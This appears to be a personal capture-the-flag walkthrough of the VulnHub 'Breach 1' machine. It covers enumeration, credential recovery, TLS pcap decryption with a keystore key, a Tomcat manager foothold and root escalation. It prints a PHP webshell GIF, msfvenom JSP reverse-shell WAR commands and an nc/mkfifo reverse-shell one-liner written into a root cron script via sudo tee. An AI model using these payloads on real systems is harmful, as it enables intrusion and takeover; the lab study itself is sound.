# Useful Info
## Possible Credentials

bill.png : `coffeestains`
`pgibbons : damnitfeel$goodtobeagang$ta`

`Michael Bolton`
`192.168.110.140/.keystore`
`Peter`
`Bill`
`http://192.168.110.140/impresscms/\_SSL\_test\_phase1.pcap`
`tomcat : Tt\5D8F(#!*u=G)4m7zB`

- /etc/passwd
```
milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash
```
- mysql 
	- `milton : thelaststraw`

## Other Info

bill.png `tEXtComment : coffeestains`


# Ports Scan & Enumeration
## Ports Scan
- This is the very first time that I encounter this kind of machine, walkthrough mentioned about IPS/IDS implementation, so new lesson to learn. ALL PORTS seems response to scan.
```bash
nmap -Pn -v 192.168.110.140
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 10:48 AEST
Initiating Parallel DNS resolution of 1 host. at 10:48
Completed Parallel DNS resolution of 1 host. at 10:48, 0.32s elapsed
Initiating Connect Scan at 10:48
Scanning 192.168.110.140 [1000 ports]
Discovered open port 3306/tcp on 192.168.110.140
Discovered open port 199/tcp on 192.168.110.140
Discovered open port 23/tcp on 192.168.110.140
Discovered open port 1025/tcp on 192.168.110.140
Discovered open port 80/tcp on 192.168.110.140
Discovered open port 8888/tcp on 192.168.110.140
Discovered open port 139/tcp on 192.168.110.140
Discovered open port 21/tcp on 192.168.110.140
Discovered open port 445/tcp on 192.168.110.140
Discovered open port 5900/tcp on 192.168.110.140
Discovered open port 3389/tcp on 192.168.110.140
Discovered open port 554/tcp on 192.168.110.140
Discovered open port 256/tcp on 192.168.110.140
Discovered open port 1723/tcp on 192.168.110.140
Discovered open port 1720/tcp on 192.168.110.140
Discovered open port 993/tcp on 192.168.110.140
Discovered open port 111/tcp on 192.168.110.140
Discovered open port 443/tcp on 192.168.110.140
Discovered open port 22/tcp on 192.168.110.140
Discovered open port 995/tcp on 192.168.110.140
Discovered open port 587/tcp on 192.168.110.140
Discovered open port 143/tcp on 192.168.110.140
Discovered open port 25/tcp on 192.168.110.140
Discovered open port 135/tcp on 192.168.110.140
Discovered open port 113/tcp on 192.168.110.140
Discovered open port 53/tcp on 192.168.110.140
Discovered open port 110/tcp on 192.168.110.140
Discovered open port 8080/tcp on 192.168.110.140
Discovered open port 843/tcp on 192.168.110.140
Discovered open port 9100/tcp on 192.168.110.140
Discovered open port 1068/tcp on 192.168.110.140
...[snip]...
Discovered open port 10566/tcp on 192.168.110.140
Discovered open port 44501/tcp on 192.168.110.140
Discovered open port 1233/tcp on 192.168.110.140
Discovered open port 10010/tcp on 192.168.110.140
Discovered open port 5061/tcp on 192.168.110.140
Discovered open port 1839/tcp on 192.168.110.140
Discovered open port 259/tcp on 192.168.110.140
Completed Connect Scan at 10:48, 2.98s elapsed (1000 total ports)
```
- So nothing from above is real, have to try my luck to frequent ports like, 22, 80, 8080, 443, etc.

## Try my luck
- Tried on port 80, 8080, 443, only 80 has response (both browser and nikto)
- We have some directory structure from /.gitignore
	- /.idea/
	- /.project
	- /.buildpath
	- /.settings/
```bash
nikto -host 192.168.110.140                                                                               130 ⨯
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.140
+ Target Hostname:    192.168.110.140
+ Target Port:        80
+ Start Time:         2021-04-22 10:50:27 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 44a, size: 534a04f49139d, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
+ 7915 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2021-04-22 10:51:27 (GMT10) (60 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


# Web Service
## Images
![Pasted image 20210422114134.png](Pasted image 20210422114134.png)
- There's extra comment from bill.png, says coffeestains, so far no idea what does it mean.
```bash
┌──(htb㉿kali)-[~/VulnHub/Breach1]
└─$ strings *.png | grep -n3 Comment
3889-,u V<P!
3890-3Mqs
3891-c{'t
3892:tEXtComment
3893-coffeestains
3894-IEND

┌──(htb㉿kali)-[~/VulnHub/Breach1]
└─$ strings *.jpg | grep -n3 Comment

┌──(htb㉿kali)-[~/VulnHub/Breach1]
└─$ strings *.gif | grep -n3 Comment
```

## git
- .gitignore file shows some projects maybe exist, we can use git-dumper to download and study it.
```bash
git-dumper http://192.168.110.140/.gitignore git-breach
[-] Testing http://192.168.110.140/.gitignore/.git/HEAD [404]
[-] http://192.168.110.140/.gitignore//.git/HEAD responded with status code 404
```
- OK, lesson learnt, we still need .git/HEAD file to download the repo, so now we can only access site by files....
```bash
curl -s http://192.168.110.140/.gitignore | html2text                                                       1 ⨯
/.idea/ 
/.project 
/.buildpath 
/.settings/
```
- Checked by web browser, they are all non-existing folders....

## Pages
- Since we've got port 80 response from [[10 - Port scan & Enumeration]], we enumerate more.
```bash
gobuster dir -u http://192.168.110.140 -x txt,html,htm,php,jsp,asp,aspx -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.110.140
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,htm,php,jsp,asp,aspx
[+] Timeout:                 10s
===============================================================
2021/04/22 11:25:55 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1098]
/images               (Status: 301) [Size: 318] [--> http://192.168.110.140/images/]
/breach.html          (Status: 200) [Size: 284]
/server-status        (Status: 403) [Size: 295]

===============================================================
2021/04/22 11:39:48 Finished
===============================================================
```

- Not too much from the breach.html, a image says should look into source code, and a button click would lead to index.html.
- Then we finally have something from index.html source page
![[Pasted image 20210422125708.png]]
```bash
echo 'Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo' | base64 -d | base64 -d
pgibbons:damnitfeel$goodtobeagang$ta
```
- Is that a credential pair? initech.html is not showing from the pages scanning.
![[Pasted image 20210422130020.png]]
- This page looks like company entry, and from source code, we can see there's mailbox and user.php.
![[Pasted image 20210422130258.png]]
- Hostname: [breach.local](mailto:webmaster@breach.local)
- Possible name:  Samir Nagheenanajar


# Port Spoof
## SSH
- Since the credential from [[15 - Web Service]] seems to be the only thing that we have currently, I go trying ssh.
```bash
ssh pgibbons@192.168.110.140
kex_exchange_identification: read: Connection reset by peer
Connection reset by 192.168.110.140 port 22
```

```bash
ssh -v pgibbons@192.168.110.140                                                                           255 ⨯
OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1k  25 Mar 2021
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 192.168.110.140 [192.168.110.140] port 22.
debug1: Connection established.
debug1: identity file /home/htb/.ssh/id_rsa type 0
debug1: identity file /home/htb/.ssh/id_rsa-cert type -1
debug1: identity file /home/htb/.ssh/id_dsa type -1
debug1: identity file /home/htb/.ssh/id_dsa-cert type -1
debug1: identity file /home/htb/.ssh/id_ecdsa type -1
debug1: identity file /home/htb/.ssh/id_ecdsa-cert type -1
debug1: identity file /home/htb/.ssh/id_ecdsa_sk type -1
debug1: identity file /home/htb/.ssh/id_ecdsa_sk-cert type -1
debug1: identity file /home/htb/.ssh/id_ed25519 type -1
debug1: identity file /home/htb/.ssh/id_ed25519-cert type -1
debug1: identity file /home/htb/.ssh/id_ed25519_sk type -1
debug1: identity file /home/htb/.ssh/id_ed25519_sk-cert type -1
debug1: identity file /home/htb/.ssh/id_xmss type -1
debug1: identity file /home/htb/.ssh/id_xmss-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_8.4p1 Debian-5
kex_exchange_identification: read: Connection reset by peer
Connection reset by 192.168.110.140 port 22
```

- But nc and telnet connection did show some interesting info.
```bash
nc -v 192.168.110.140 22
192.168.110.140: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.110.140] 22 (ssh) open
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00

telnet 192.168.110.140 22                                                                                 255 ⨯
Trying 192.168.110.140...
Connected to 192.168.110.140.
Escape character is '^]'.
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
Connection closed by foreign host.
```

- Google the info get one software named portspoof
![[Pasted image 20210422124449.png]]
![[Pasted image 20210422124655.png]]
- This is exactly the one cause our problem.

# CMS
## ImpressCMS
- Finally from [[15 - Web Service]] we've got a CMS system, maybe our credential is for this
![[Pasted image 20210422131001.png]]
- And we do get in, it's time to play around the CMS.
![[Pasted image 20210422131048.png]]
- We have more names come out:
	- [Michael Bolton](http://192.168.110.140/impresscms/userinfo.php?uid=3)

### Mails
```
[ImpressCMS Admin](http://192.168.110.140/impresscms/userinfo.php?uid=1)  
![](http://192.168.110.140/impresscms/uploads/blank.gif)  

![](http://192.168.110.140/impresscms/images/subject/icon1.gif)  Sent: 2016/6/4 14:40:26

---

**FWD: Thank you for your purchase of Super Secret Cert Pro!**  
  
Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob ------------------------------------------------------------------------------------------------------------------------------------------- From: registrar@penetrode.com Sent: 02 June 2016 16:16 To: bob@initech.com; admin@breach.local Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!
```
- Super Secret Cert: 192.168.110.140/.keystore

```
[Michael Bolton](http://192.168.110.140/impresscms/userinfo.php?uid=3)  
![](http://192.168.110.140/impresscms/uploads/blank.gif)  

![](http://192.168.110.140/impresscms/images/subject/icon1.gif)  Sent: 2016/6/6 19:25:18

---

**IDS/IPS system**  
  
Hey Peter,  
  
I got a really good deal on an IDS/IPS system from a vendor I met at that happy hour at Chotchkie's last week!  
  
\-Michael
```
- a name called Peter. [Peter Gibbons]
```
Login Name   pgibbons
Display Name   Peter Gibbons
Email    peter.gibbons@initech.com
```

```
[ImpressCMS Admin](http://192.168.110.140/impresscms/userinfo.php?uid=1)  
![](http://192.168.110.140/impresscms/uploads/blank.gif)  

![](http://192.168.110.140/impresscms/images/subject/icon1.gif)  Sent: 2016/6/13 22:35:55

---

**Posting sensitive content**  
  
Peter, yeahhh, I'm going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that'd be great. -Bill
```
- a name called Bill, and he might be the CMS Admin role.
- Is there any sensitive artifacts NOT just in admin portal?

- Try to upload malicious image, but there's size limitation
```bash
┌──(htb㉿kali)-[~/VulnHub/Breach1]
└─$ file evil.gif
evil.gif: GIF image data, version 89a, 2619 x 16188

┌──(htb㉿kali)-[~/VulnHub/Breach1]
└─$ cat evil.gif
GIF89a;
<?php system($_GET["cmd"]); ?>
```
![[Pasted image 20210422153523.png]]
- Nothing anymore around, but by clicking around, found that the content menu can be expanded
![[Pasted image 20210422155247.png]]
- Then there's a post:
	- http://192.168.110.140/impresscms/\_SSL\_test\_phase1.pcap
	- They told me the alias, storepassword and keypassword are all set to 'tomcat'. 
```
# SSL implementation test capture [![Edit](http://192.168.110.140/impresscms/images/kfaenza/actions/edit.png "Edit")](http://192.168.110.140/impresscms/modules/content/content.php?op=mod&content_id=1) [![Delete](http://192.168.110.140/impresscms/images/kfaenza/actions/editdelete.png "Delete")](http://192.168.110.140/impresscms/modules/content/content.php?op=del&content_id=1) 

Published by [Peter Gibbons](http://192.168.110.140/impresscms/modules/content/index.php?uid=2) on 2016/6/4 21:37:05. (0 reads)

Team - I have uploaded a pcap file of our red team's re-production of the attack. I am not sure what trickery they were using but I cannot read the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. [](http://192.168.110.140/impresscms/_SSL_test_phase1.pcap)[http://192.168.110.140/impresscms/\_SSL\_test\_phase1.pcap](http://192.168.110.140/impresscms/_SSL_test_phase1.pcap) They told me the alias, storepassword and keypassword are all set to 'tomcat'. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I'm going fishing for the next 2 days and will not have access to email or phone.
```

- We had already know that the pcap is encrypted by some key, and we do have a java keystore
```bash
file keystore
keystore: Java KeyStore
```
- Here we learn how to extract the rsa key information from  this java keystore, and now we know why he mentioned about alias, storepassword and keypassword:
```bash
keytool -importkeystore -srckeystore keystore -srcstorepass tomcat -srckeypass tomcat -srcalias tomcat -destalia
s tomcat -destkeystore rsa.p12 -deststoretype PKCS12 -deststorepass tomcat -destkeypass tomcat
Importing keystore keystore to rsa.p12...
```

```bash
openssl pkcs12 -in rsa.p12 -nodes -nocerts -out rsa.pem
Enter Import Password: tomcat
```

```bash
cat rsa.pem
Bag Attributes
    friendlyName: tomcat
    localKeyID: 54 69 6D 65 20 31 36 31 39 30 37 31 38 33 38 39 34 33
Key Attributes: <No Attributes>
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCjJXnELHvCEyTT
ZW/cJb7sFuwIUy5l5DkBXD9hBgRtpUSIv9he5RbJQwGuwyw5URbm3pa7z1eoRjFW
HLMVzKYte6AyyjUoWcc/Fs9fiu83+F0G36JmmFcxLFivVQwCHKhrajUc15i/XtCr
ExEDNL0igM8YnCPq4J9lXrXUanLltR464F7cJdLbkqHiqRvoFiOQi9e3CIZ86uoY
UNBupj2/njMFRuB7dEoeaQ/otHZIgCgjbP76I+/xyL/RkGxYuU0e1tpQiLxTi7kF
nJ1Rd55Gd+DvzuBiI9F+fxa4+TSQvRvQEzJIKowbPw6h82Cd66yFju8c2AKiaDie
F+AqVim3AgMBAAECggEBAIr2Ssdr1GY0hDODvUnY5MyXoahdobGsOVoNRvbPd0ol
cUDBl/0MSOJZLr+7Apo3lbhEdEO4kkOEtlVQ0MGKtSkcmhFo5updvjbgqPYKk0Qr
SqGmLuAQdoQt78Q4Pqg13MbRijfs8/BdRIPTE7SVYVxYNw4RQQ65EUv45gvuN7ur
shV5WSHVaN5QyUHyOTKcvFuBqxb9Mfo2NtRGZCG2QuG8V/C+k2k8+Q+n2wDaOXw8
sIWKVMHngOMcW1OBnM3ac/bTeI2+LI5cMsBZqYlLmkH1AOlnCgpH7389NbRQQJSo
sExX51v5r2mmI1JdzszwQYqRfH7+nugDRjBEN2ztqFECgYEA4eBiLFP9MeLhjti8
PDElSG4MVf/I9WXfLDU79hev7npRw8LE0rzPgawXOL8NhTbp8/X1D071bGaA3rCU
oBEEPclXlSwXHroZVjJALDhaPrIfFT6gBXlb9wAYSzWYED4LKXDuddVChrTo4Lmx
XaHb/KM7kpPuUWr+xccEEuNJBnMCgYEAuOduxGz2Ecd+nwATsZpjgG5/SwLL/rd0
TEMNQbB/XUIOI8mZpw5Dn1y71qCijk/A+oVzohc6Dspso4oXLMy0b+HCFPTKuGgg
Hf8QV5YbDg0urH8KNNEEH7Dx/C6cp6vVAcj6eQ2wOwW62yVY8gy2elWH0gte1BXl
hHiKIaLueq0CgYEAoAwi4+/7Ny7gzhvKfQgBt+mqOgGM/jzZvnRV8VDlayAm8YP/
fKcmjWZH6gCN7vdzHFcJ9nfnNJEI/UG3fhewnqscsOlV1ILe0xG2IN8pKsWBescu
EdLlFAZwMFJgVhnwRMPtY3bhtZtYa2uIPqUiwEdVPc4uDmi276LNwyhjJPsCgYA7
ANcO5TpMiB12vX6LURnpVNlX5WeVO5Nn9omXaavq5XY/o0hdz6ZyhxQFtDLLONX6
23T/x2umZp/uO9WTXStC/IaDS24ZFFkTWV4spOCzRi+bqdpm6j/noP5HG9SviJyr
Oif7Uwvmebibz7onWzkrpnl15Fz5Tpd0A0cI3sY87QKBgQDLZ9pl505OMHOyY6Xr
geszoeaj4cQrRF5MO2+ad81LT3yoLjZyARaJJMEAE7FZxPascemlg9KR3JPnevIU
3RdMGHX75yr92Sd8lNQvSO6RWUuRnc889xN1YrpPx5G1VppIFqTrcB0gAiREkeUA
pHiPhbocjixKJz9xx+pG0jDkrg==
-----END PRIVATE KEY-----
```

- But even have no this key, we can still get from the pcap that our victim host is using port 8443 to talk to another PC box.
![[Pasted image 20210422162703.png]]

## Wireshark
- New things to learn, put rsa key into wireshark
![[Pasted image 20210422170920.png]]
- Then we will see TLS menu item from Follow menu, then we can see the decrypted content
![[Pasted image 20210422171551.png]]
- And there's one more base64 code
![[Pasted image 20210422172346.png]]
```bash
echo 'dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC' | base64 -d
tomcat:Tt\5D8F(#!*u=G)4m7zB
```
- And we now have the decrypted url: https://192.168.110.140:8443/_M@nag3Me/html

# HTTPS_M@nag3Me
## Firefox trouble
- I've got an access trouble from my firefox to this url: https://192.168.110.140:8443/_M@nag3Me/html
![[Pasted image 20210423111653.png]]
- And tried all fixing steps from online, none of them work, then one page said it could be incompatible from old tls website with new web browser, which can be solved by use proxy
- Which is BurpSuite coming; Always use Burp as Intercepter, new trick learnt, set browser proxy to Burp, and then turn off the intercept, then Burp will work as transparent proxy.
- Then this url is accessible, and we will get an login prompt, and we can use the credential get from the pcap [[20 - ImpressCMS]]
![[Pasted image 20210423112910.png]]
![[Pasted image 20210423112937.png]]

## WAR upload
- Try to make a malicious WAR which can be deploy in tomcat to get reverse shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.59.60 lport=9001 -f war -o pwn.war
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of war file: 1550 bytes
Saved as: pwn.war
```
- But after select the file and click deploy, I've got permission denied
![[Pasted image 20210423120353.png]]
- Alright the reason is that tomcat use java, and I did not use the java/jsp to generate WAR
```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.110.100 lport=9001 -f war -o pwn.war
Payload size: 1102 bytes
Final size of war file: 1102 bytes
Saved as: pwn.war
```
![[Pasted image 20210423122003.png]]
- Then we will have reverse shell

# Privesc
## reverse shell
- We've got our reverse shell from [[25 - HTTPS_M@nag3Me]], after deployment, have to click the `/pwn` link to get the reverse shell
```bash
┌──(htb㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.110.100] from (UNKNOWN) [192.168.110.140] 43116
id
uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
tomcat6@Breach:/var/lib/tomcat6$ ^Z
[1]+  Stopped                 nc -lvnp 9001
┌──(htb㉿kali)-[~]
└─$ stty raw -echo
┌──(htb㉿kali)-[~]
nc -lvnp 9001

tomcat6@Breach:/var/lib/tomcat6$ stty rows 96 cols 116
tomcat6@Breach:/var/lib/tomcat6$ export TERM=xterm
tomcat6@Breach:/var/lib/tomcat6$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash
```

- Check home directory
	- *1059404    4 -rwxrwxrwx   1 milton   milton        755 Jun  4  2016 ./milton/some_script.sh*
	- *1048609  112 -rw-rw-r--   1 milton   milton     111255 Jun  4  2016 ./milton/my_badge.jpg*
	- *1058616    4 -rw-rw-r--   1 milton   milton       2245 May 20  2016 ./milton/.keystore*
```bash
tomcat6@Breach:/home$ find . -ls
917505    4 drwxr-xr-x   4 root     root         4096 Jun  4  2016 .
930005    4 drwxr-xr-x   3 blumbergh blumbergh     4096 Jun 12  2016 ./blumbergh
930179    4 -rw-------   1 blumbergh blumbergh       61 Jun 12  2016 ./blumbergh/.bash_history
930007    4 -rw-r--r--   1 blumbergh blumbergh      220 Jun  4  2016 ./blumbergh/.bash_logout
930009    4 -rw-r--r--   1 blumbergh blumbergh     3637 Jun  4  2016 ./blumbergh/.bashrc
930013    4 drwx------   2 blumbergh blumbergh     4096 Jun  6  2016 ./blumbergh/.cache
find: `./blumbergh/.cache': Permission denied
930011    4 -rw-r--r--   1 blumbergh blumbergh      675 Jun  4  2016 ./blumbergh/.profile
1049078    4 drwxr-xr-x   3 milton   milton       4096 Jun  6  2016 ./milton
1048961    4 -rw-------   1 milton   milton        234 Jun 11  2016 ./milton/.bash_history
1055719    4 -rw-r--r--   1 milton   milton        220 May 20  2016 ./milton/.bash_logout
1055722    4 -rw-r--r--   1 milton   milton       3637 May 20  2016 ./milton/.bashrc
1059404    4 -rwxrwxrwx   1 milton   milton        755 Jun  4  2016 ./milton/some_script.sh
1048611    4 -rw-------   1 milton   milton        407 Jun  4  2016 ./milton/.mysql_history
1049122    4 drwx------   2 milton   milton       4096 May 20  2016 ./milton/.cache
find: `./milton/.cache': Permission denied
1058611    4 -rw-r--r--   1 milton   milton        675 May 20  2016 ./milton/.profile
1048609  112 -rw-rw-r--   1 milton   milton     111255 Jun  4  2016 ./milton/my_badge.jpg
1058616    4 -rw-rw-r--   1 milton   milton       2245 May 20  2016 ./milton/.keystore
1059408    4 -rw-r--r--   1 root     root           66 Jun  4  2016 ./milton/.selected_editor
```

- Checked by md5sum that ./milton/.keystore IS the keystore we've got from web service.
- Checked ./milton/my_bage.jpg, seems nothing

## More Enumeration
### linpeas.sh
1. `4.2.0-27-generic`
2. `/etc/cron.daily/tomcat6`
	- nothing useful from this file.
3. `[+] MySQL connection using root/NOPASS ................. Yes`
	- `milton           | 6450d89bd3aff1d893b85d3ad65d2ec2`
	- `6450d89bd3aff1d893b85d3ad65d2ec2 | md5 | thelaststraw`
4. `/etc/init.d/portly.sh`
	```bash
	iptables -t nat -A PREROUTING -p tcp --match multiport --dport 1:79,81:8442,8444:65535 -j REDIRECT --to-ports 4444 && /usr/local/bin/portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures -D
	```
5. This is the part I did not think through, which is user [blumbergh]'s full name is [bill blumbergh] and we still have one piece of information that from bill.png says a comment `coffeestains`, is it easy enough to match this word to user blumbergh's password?
	
### milton
1. not sudo user
2. `-rwxrwxrwx 1 milton milton    755 Jun  4  2016 some_script.sh`
3. nothing useful from .bash_history either

### blumbergh
1. .bash_history
```bash
blumbergh@Breach:~$ cat .bash_history
clear
logoff
logout
exit
cd /usr/share/cleanup
cat tidyup.sh
exit
```
2. tidyup.sh
```bash
blumbergh@Breach:~$ ls -al /usr/share/cleanup/tidyup.sh
-rwxr-xr-x 1 root root 289 Jun 12  2016 /usr/share/cleanup/tidyup.sh

blumbergh@Breach:~$ cat /usr/share/cleanup/tidyup.sh
#!/bin/bash

#Hacker Evasion Script
#Initech Cyber Consulting, LLC
#Peter Gibbons and Michael Bolton - 2016
#This script is set to run every 3 minutes as an additional defense measure against hackers.

cd /var/lib/tomcat6/webapps && find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf

blumbergh@Breach:~$ crontab -l
no crontab for blumbergh
blumbergh@Breach:~$ sudo -l
Matching Defaults entries for blumbergh on Breach:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on Breach:
    (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
```

- This is the way...
```bash
blumbergh@Breach:~$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.100 9001 >/tmp/f' | sudo
 /usr/bin/tee /usr/share/cleanup/tidyup.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.100 9001 >/tmp/f

blumbergh@Breach:~$ cat /usr/share/cleanup/tidyup.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.100 9001 >/tmp/f
```

- Root
```bash
┌──(htb㉿kali)-[~/VulnHub/Breach1]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.110.100] from (UNKNOWN) [192.168.110.140] 43124
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
flair.jpg
# ls -al /root
total 60
drwx------  4 root root  4096 Jun 12  2016 .
drwxr-xr-x 22 root root  4096 Jun  4  2016 ..
-rw-------  1 root root   115 Jun 12  2016 .bash_history
-rw-r--r--  1 root root  3106 Feb 19  2014 .bashrc
drwx------  2 root root  4096 Jun  6  2016 .cache
-rw-r--r--  1 root root   840 Jun 11  2016 .flag.txt
-rw-r--r--  1 root root 23792 Jun  4  2016 flair.jpg
-rw-r--r--  1 root root   140 Feb 19  2014 .profile
drwxr-xr-x  2 root root  4096 Jun  5  2016 .rpmdb
-rw-r--r--  1 root root    66 Jun  4  2016 .selected_editor
# cat /root/.flag.txt
-----------------------------------------------------------------------------------

______                     _     __   _____      _____ _          _____          _
| ___ \                   | |   /  | |  _  |    |_   _| |        |  ___|        | |
| |_/ /_ __ ___  __ _  ___| |__ `| | | |/' |______| | | |__   ___| |__ _ __   __| |
| ___ \ '__/ _ \/ _` |/ __| '_ \ | | |  /| |______| | | '_ \ / _ \  __| '_ \ / _` |
| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |
\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|


-----------------------------------------------------------------------------------
Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!

Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.

```


